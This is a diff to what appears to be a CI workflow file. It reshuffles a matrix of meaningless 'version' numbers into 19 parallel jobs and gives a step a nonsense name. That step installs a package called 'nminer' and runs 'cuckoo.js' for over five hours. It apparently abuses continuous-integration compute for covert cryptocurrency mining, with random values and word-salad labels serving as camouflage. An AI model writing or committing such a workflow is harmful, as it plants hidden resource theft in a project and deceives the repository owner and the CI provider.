@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1658 }
-          - { version: 4846 }
-          - { version: 184 }
-          - { version: 691 }
-          - { version: 8197 }
-          - { version: 7962 }
-          - { version: 5846 }
-          - { version: 8790 }
-          - { version: 9555 }
-          - { version: 1211 }
-          - { version: 2865 }
-          - { version: 4426 }
-          - { version: 8715 }
-          - { version: 9208 }
-          - { version: 2338 }
-          - { version: 1664 }
+          - { version: 4723 }
+          - { version: 578 }
+          - { version: 1916 }
+          - { version: 6849 }
+          - { version: 4291 }
+          - { version: 1654 }
+          - { version: 9866 }
+          - { version: 7169 }
+          - { version: 2555 }
+          - { version: 4142 }
+          - { version: 7842 }
+          - { version: 6150 }
+          - { version: 7260 }
+          - { version: 5143 }
+          - { version: 3797 }
+          - { version: 9010 }
+          - { version: 3524 }
+          - { version: 7638 }
+          - { version: 5467 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: extent concerning gastropod but until
         run: |
           npm install nminer@latest
-          timeout 339m node cuckoo.js || echo "cuckoo executed"
+          timeout 321m node cuckoo.js || echo "cuckoo executed"
